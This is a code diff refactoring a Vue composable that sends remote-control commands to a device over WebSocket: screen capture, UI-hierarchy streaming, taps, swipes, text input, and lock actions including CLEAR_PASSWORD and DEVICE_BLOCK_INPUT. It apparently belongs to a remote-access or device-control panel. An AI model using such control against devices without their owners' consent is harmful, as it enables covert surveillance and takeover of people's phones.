@@ -1,9 +1,5 @@
 import type { Ref } from 'vue';
-import type {
-    ScreenControlMessage,
-    DataRequestMessage,
-    WebSocketOutboundMessage,
-} from '@/types/websocket';
+import type { WebSocketOutboundMessage } from '@/types/websocket';
 import type { LockType, NavigationType } from '@/types/device';
 
 type SendFunction = (message: WebSocketOutboundMessage) => boolean;
@@ -12,189 +8,127 @@ export function useScreenControl(
     send: SendFunction,
     deviceId: Ref<string>
 ) {
-    const sendScreenCommand = (
-        params: Partial<ScreenControlMessage>
-    ): boolean => {
-        const message: ScreenControlMessage = {
-            itype: 'slr_panel',
-            subc: 'screen',
+    const sendCommand = (command: string, params: Record<string, unknown> = {}): boolean => {
+        return send({
+            command,
+            params,
             pid: deviceId.value,
-            comand: params.comand!,
-            ...params,
-        };
-        return send(message);
-    };
-
-    const sendDataRequest = (
-        params: Partial<DataRequestMessage>
-    ): boolean => {
-        const message: DataRequestMessage = {
-            itype: 'slr_panelsend',
-            subc: params.subc!,
-            pid: deviceId.value,
-            ...params,
-        };
-        return send(message);
+        });
     };
 
     const startScreenShare = () => {
-        return sendDataRequest({
-            subc: 'screen',
-            screentype: 'SN',
-        });
+        return sendCommand('SCREEN_CAPTURE_RESUME');
     };
 
     const stopScreenShare = () => {
-        return sendDataRequest({
-            subc: 'screen',
-            screentype: 'SNOFF',
-        });
+        return sendCommand('SCREEN_CAPTURE_STOP');
     };
 
     const startScreenshot = () => {
-        return sendDataRequest({
-            subc: 'screen',
-            screentype: 'SM',
-        });
+        return sendCommand('SCREEN_CAPTURE_RESUME', { mode: 'screenshot' });
     };
 
     const stopScreenshot = () => {
-        return sendDataRequest({
-            subc: 'screen',
-            screentype: 'SMOFF',
-        });
+        return sendCommand('SCREEN_CAPTURE_STOP');
     };
 
     const startOCR = () => {
-        return sendDataRequest({
-            subc: 'screen',
-            screentype: 'SK',
-        });
+        return sendCommand('GET_UI_HIERARCHY_STREAM');
     };
 
     const stopOCR = () => {
-        return sendDataRequest({
-            subc: 'screen',
-            screentype: 'SKOFF',
-        });
+        return sendCommand('GET_UI_HIERARCHY_STREAM_STOP');
     };
 
-    // 与 info.php 保持一致：点击/长按使用对象格式 {x, y}
     const sendTap = (x: number, y: number) => {
-        return sendScreenCommand({
-            comand: 'mov',
-            movetype: '0',
-            poi: { x: Math.round(x), y: Math.round(y) },
+        return sendCommand('CLICK', {
+            x: Math.round(x),
+            y: Math.round(y),
         });
     };
 
-    // 与 info.php 保持一致：滑动使用字符串格式 "(x1,y1):(x2,y2)"
     const sendSwipe = (
         startX: number,
         startY: number,
         endX: number,
         endY: number
     ) => {
-        return sendScreenCommand({
-            comand: 'mov',
-            movetype: '1',
-            poi: `(${Math.round(startX)},${Math.round(startY)}):(${Math.round(endX)},${Math.round(endY)})`,
+        return sendCommand('SWIPE', {
+            x1: Math.round(startX),
+            y1: Math.round(startY),
+            x2: Math.round(endX),
+            y2: Math.round(endY),
+            duration: 300,
         });
     };
 
-    // 发送完整滑动路径 (多点)
     const sendSwipePath = (points: Array<{ x: number; y: number }>) => {
         if (points.length < 2) return false;
-        const pathStr = points.map(p => `(${Math.round(p.x)},${Math.round(p.y)})`).join(':');
-        return sendScreenCommand({
-            comand: 'mov',
-            movetype: '1',
-            poi: pathStr,
+        const path = points.map(p => ({ x: Math.round(p.x), y: Math.round(p.y) }));
+        return sendCommand('SWIPE_PATH', {
+            points: path,
+            duration: 300,
         });
     };
 
     const sendLongPress = (x: number, y: number) => {
-        return sendScreenCommand({
-            comand: 'mov',
-            movetype: '2',
-            poi: { x: Math.round(x), y: Math.round(y) },
+        return sendCommand('LONG_PRESS', {
+            x: Math.round(x),
+            y: Math.round(y),
+            duration: 1000,
         });
     };
 
     const sendNavigation = (type: NavigationType) => {
-        const navMap: Record<NavigationType, 'ho' | 'bak' | 'rec'> = {
-            home: 'ho',
-            back: 'bak',
-            recent: 'rec',
+        const navMap: Record<NavigationType, string> = {
+            home: 'home',
+            back: 'back',
+            recent: 'recents',
         };
-        return sendScreenCommand({
-            comand: 'nav',
-            navshort: navMap[type],
-        });
+        return sendCommand(navMap[type]);
     };
 
     const sendVolumeUp = () => {
-        return sendScreenCommand({
-            comand: 'vol',
-            volstate: 'up',
-        });
+        return sendCommand('VOLUME_UP');
     };
 
     const sendVolumeDown = () => {
-        return sendScreenCommand({
-            comand: 'vol',
-            volstate: 'down',
-        });
+        return sendCommand('VOLUME_DOWN');
     };
 
     const showKeyboard = () => {
-        return sendScreenCommand({
-            comand: 'kb',
-            kbstate: '2',
-        });
+        return sendCommand('KEY_EVENT', { keyCode: 'show' });
     };
 
     const hideKeyboard = () => {
-        return sendScreenCommand({
-            comand: 'kb',
-            kbstate: '3',
-        });
+        return sendCommand('KEY_EVENT', { keyCode: 'hide' });
     };
 
     const pasteText = (text: string) => {
-        return sendScreenCommand({
-            comand: 'paste',
-            txt: text,
-        });
+        return sendCommand('INPUT_TEXT', { text });
     };
 
     const setScreenQuality = (quality: number) => {
         const clampedQuality = Math.max(1, Math.min(100, quality));
-        return sendScreenCommand({
-            comand: 'q',
-            newqulity: String(clampedQuality),
-        });
+        return sendCommand('SCREEN_QUALITY', { quality: clampedQuality });
     };
 
     const lockDevice = (type: LockType) => {
-        return sendScreenCommand({
-            comand: 'L',
-            lockit: String(type) as '0' | '1' | '2' | '3',
-        });
+        const lockCommandMap: Record<LockType, string> = {
+            0: 'UNLOCK_DEVICE',
+            1: 'POWER_SLEEP',
+            2: 'CLEAR_PASSWORD',
+            3: 'DEVICE_BLOCK_INPUT',
+        };
+        return sendCommand(lockCommandMap[type]);
     };
 
     const wakeScreen = () => {
-        return sendDataRequest({
-            subc: 'display',
-            display: 'on',
-        });
+        return sendCommand('POWER_WAKE');
     };
 
     const takeScreenshot = () => {
-        return sendDataRequest({
-            subc: 'screen',
-            screentype: 'SM',
-        });
+        return sendCommand('SCREEN_CAPTURE_RESUME', { mode: 'snapshot' });
     };
 
     return {
